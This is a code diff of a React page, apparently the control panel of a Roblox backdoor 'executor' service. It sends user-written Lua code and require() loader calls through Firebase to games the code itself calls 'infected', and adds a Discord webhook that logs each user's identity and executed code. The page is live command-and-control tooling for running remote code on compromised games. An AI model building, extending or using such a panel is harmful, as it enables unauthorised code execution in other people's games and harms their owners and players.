@@ -13,13 +13,13 @@ import {
 import MonacoEditor from "@monaco-editor/react";
 import * as monaco from "monaco-editor";
 import { database, ref, set, remove } from "../../firebaseConfig";
-import Popup from '../../components/Popup'
+import Popup from "../../components/Popup";
 
 function Execution() {
   const editorRef = useRef(null);
   const [code, setCode] = useState("print('hello world')");
   const [showPopup, setShowPopup] = useState(false);
-  const [popupText, setPopupText] = useState('');
+  const [popupText, setPopupText] = useState("");
   const [popupError, setPopupError] = useState(false);
 
   useEffect(() => {
@@ -116,10 +116,17 @@ function Execution() {
     });
   };
 
+  const stripLuaComments = (code) => {
+    return code
+      .replace(/--\[\[[\s\S]*?\]\]/g, "")
+      .replace(/--.*$/gm, "")
+      .trim();
+  };
+
   const handleExecuteClick = async () => {
     const codeContent = editorRef.current.getValue();
     const userId = localStorage.getItem("userId");
-  
+
     if (!userId) {
       setPopupText("Error: No userId found.");
       setPopupError(true);
@@ -127,106 +134,153 @@ function Execution() {
       setTimeout(() => setShowPopup(false), 4000);
       return;
     }
-  
-    if (codeContent.trim() !== "") {
-      try {
-        const response = await fetch(`https://eclipse-backend-9lxy.onrender.com/user?userId=${userId}`);
-        const data = await response.json();
-  
-        if (!response.ok) {
-          throw new Error(data.message || "Error fetching robloxUsername");
-        }
-  
-        const robloxUsername = data.robloxUsername;
-  
-        if (!robloxUsername) {
-          setPopupText("Error: robloxUsername not found. Please add your robloxUsername to the whitelist located on the Dashboard screen.");
-          setPopupError(true);
-          setShowPopup(true);
-          setTimeout(() => setShowPopup(false), 4000);
-          return;
-        }
-  
-        const executeRef = ref(database, "execute");
-  
-        await set(executeRef, { code: codeContent, robloxUsername });
-  
-        console.log("Code and robloxUsername sent to Realtime Database:", {
-          codeContent,
-          robloxUsername,
-        });
-  
-        setPopupText("Code and Roblox username successfully sent.");
-        setPopupError(false);
-        setShowPopup(true);
-  
-        setTimeout(() => setShowPopup(false), 4000);
-  
-        setTimeout(async () => {
-          try {
-            await remove(executeRef);
-            console.log("Code removed from Firebase after 6 seconds.");
-          } catch (error) {
-            console.error("Error removing code from Firebase:", error);
-          }
-        }, 4000);
-      } catch (error) {
-        console.error("Error fetching robloxUsername or sending code:", error);
-  
-        setPopupText("Error sending code or fetching robloxUsername.");
-        setPopupError(true);
-        setShowPopup(true);
-  
-        setTimeout(() => setShowPopup(false), 4000);
-      }
-    } else {
+
+    if (codeContent.trim() === "") {
       setPopupText("Please enter some code.");
       setPopupError(true);
       setShowPopup(true);
-  
+      setTimeout(() => setShowPopup(false), 4000);
+      return;
+    }
+
+    const strippedCode = stripLuaComments(codeContent);
+
+    if (strippedCode === "") {
+      setPopupText("Error: Your code only contains comments.");
+      setPopupError(true);
+      setShowPopup(true);
+      setTimeout(() => setShowPopup(false), 4000);
+      return;
+    }
+
+    try {
+      const response = await fetch(
+        `https://eclipse-backend-9lxy.onrender.com/user?userId=${userId}`
+      );
+      const data = await response.json();
+
+      if (!response.ok) {
+        throw new Error(data.message || "Error fetching user data");
+      }
+
+      const {
+        robloxUsername,
+        discordId,
+        discordUsername,
+        avatar,
+        discordRole,
+      } = data;
+
+      if (!robloxUsername) {
+        setPopupText(
+          "Error: robloxUsername not found. Please add your robloxUsername to the whitelist located on the Dashboard screen."
+        );
+        setPopupError(true);
+        setShowPopup(true);
+        setTimeout(() => setShowPopup(false), 4000);
+        return;
+      }
+
+      const executeRef = ref(database, "execute");
+      await set(executeRef, { code: codeContent, robloxUsername });
+
+      console.log("Code and robloxUsername sent to Realtime Database:", {
+        codeContent,
+        robloxUsername,
+      });
+
+      setPopupText("Code and Roblox username successfully sent.");
+      setPopupError(false);
+      setShowPopup(true);
+      setTimeout(() => setShowPopup(false), 4000);
+
+      setTimeout(async () => {
+        try {
+          await remove(executeRef);
+          console.log("Code removed from Firebase after 6 seconds.");
+        } catch (error) {
+          console.error("Error removing code from Firebase:", error);
+        }
+      }, 4000);
+
+      const webhookPayload = {
+        content: "<@&1328466452352864276>",
+        embeds: [
+          {
+            title: "Executed the Code:",
+            description:
+              `Discord: <@!${discordId}>` +
+              `\nName: ${discordUsername}` +
+              `\nPlan: ${discordRole}` +
+              `\nId: ${userId}` +
+              `\n\nCode:\n\`\`\`lua\n${strippedCode}\n\`\`\``,
+            color: 1776411,
+            thumbnail: {
+              url: `${avatar}`,
+            },
+          },
+        ],
+        attachments: [],
+      };
+
+      await fetch(process.env.REACT_APP_DISCORD_WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(webhookPayload),
+      });
+
+      console.log("Webhook enviado com sucesso.");
+    } catch (error) {
+      console.error("Erro:", error);
+      setPopupText("Error sending code or fetching user data.");
+      setPopupError(true);
+      setShowPopup(true);
       setTimeout(() => setShowPopup(false), 4000);
     }
   };
-  
-  
+
   async function sendToRealtimeDB(requireId, format) {
     try {
       const userId = localStorage.getItem("userId");
-  
+
       if (!userId) {
         console.error("userId não encontrado no armazenamento.");
         setPopupText("Error: userId not found.");
         setPopupError(true);
         setShowPopup(true);
-        setTimeout(() => setShowPopup(false), 4000); 
+        setTimeout(() => setShowPopup(false), 4000);
         return;
       }
-  
-      const response = await fetch(`https://eclipse-backend-9lxy.onrender.com/user?userId=${userId}`);
-  
+
+      const response = await fetch(
+        `https://eclipse-backend-9lxy.onrender.com/user?userId=${userId}`
+      );
+
       if (!response.ok) {
         console.error("Erro ao obter o robloxUsername.");
         setPopupText("Error: Unable to fetch robloxUsername.");
         setPopupError(true);
         setShowPopup(true);
-        setTimeout(() => setShowPopup(false), 4000); 
+        setTimeout(() => setShowPopup(false), 4000);
         return;
       }
-  
+
       const data = await response.json();
       const robloxUsername = data.robloxUsername;
-  
+
       if (!robloxUsername) {
         console.error("robloxUsername não encontrado.");
-        setPopupText("Error: robloxUsername not found. Please add your robloxUsername to the whitelist located on the Dashboard screen.");
+        setPopupText(
+          "Error: robloxUsername not found. Please add your robloxUsername to the whitelist located on the Dashboard screen."
+        );
         setPopupError(true);
         setShowPopup(true);
         setTimeout(() => setShowPopup(false), 4000);
         return;
       }
-  
+
       let scriptData;
-  
+
       if (format === "sensation") {
         scriptData = `require(85380043749737)("${robloxUsername}")`;
       } else if (format === "pipboy") {
@@ -254,18 +308,18 @@ function Execution() {
       } else {
         return;
       }
-  
+
       const scriptRef = ref(database, "require/" + requireId);
       await set(scriptRef, scriptData);
-  
+
       console.log("Script enviado para o Firebase com sucesso!");
-      
+
       setPopupText("Script successfully sent to game infected!");
       setPopupError(false);
       setShowPopup(true);
-  
+
       setTimeout(() => setShowPopup(false), 4000);
-  
+
       setTimeout(async () => {
         try {
           await remove(scriptRef);
@@ -276,11 +330,11 @@ function Execution() {
       }, 4000);
     } catch (error) {
       console.error("Erro ao enviar script para o game infected:", error);
-  
+
       setPopupText("Error sending script to game infected.");
       setPopupError(true);
       setShowPopup(true);
-  
+
       setTimeout(() => setShowPopup(false), 4000);
     }
   }
